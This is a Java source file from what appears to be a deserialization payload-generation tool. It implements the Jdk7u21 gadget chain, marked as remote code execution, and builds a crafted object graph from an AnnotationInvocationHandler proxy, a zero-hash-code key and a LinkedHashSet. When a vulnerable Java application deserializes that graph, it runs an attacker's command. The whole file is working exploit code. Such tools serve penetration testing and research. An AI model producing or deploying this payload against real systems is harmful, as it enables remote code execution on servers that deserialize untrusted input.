package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.exceptions.AdapterMismatchException;
import org.ses.gadgetbuilder.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;

@Authors({ Authors.FROHOFF })
@Impact(Impact.RCE)
public class Jdk7u21 extends MethodInvokeGadgetChain<NoTrampoline, MethodInvokeAdapter> {
    public Jdk7u21(NoTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        Object sink = this.methodInvokeAdapter.getInvocationTarget(command);

        String zeroHashCodeStr = "f5a5a608";
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, map);

        Class targetInterface = this.methodInvokeAdapter.getTargetInterface();
        if (targetInterface == null) {
            throw new AdapterMismatchException("Jdk7u21 gadget chain requires a sink method adapter class that has interfaces " +
                    "corresponding to the to be invoked methods. This is not the case for " + this.methodInvokeAdapter.getClass().getSimpleName());
        }

        Reflections.setFieldValue(tempHandler, "type", Templates.class);

        Object proxy = Proxy.newProxyInstance(this.getClass().getClassLoader(), new Class[] {targetInterface}, tempHandler);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(sink);
        set.add(proxy);
        Reflections.setFieldValue(sink, "_auxClasses", null);
        Reflections.setFieldValue(sink, "_class", null);

        map.put(zeroHashCodeStr, sink); // swap in real object

        return new TrampolineConnector(set);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }
}
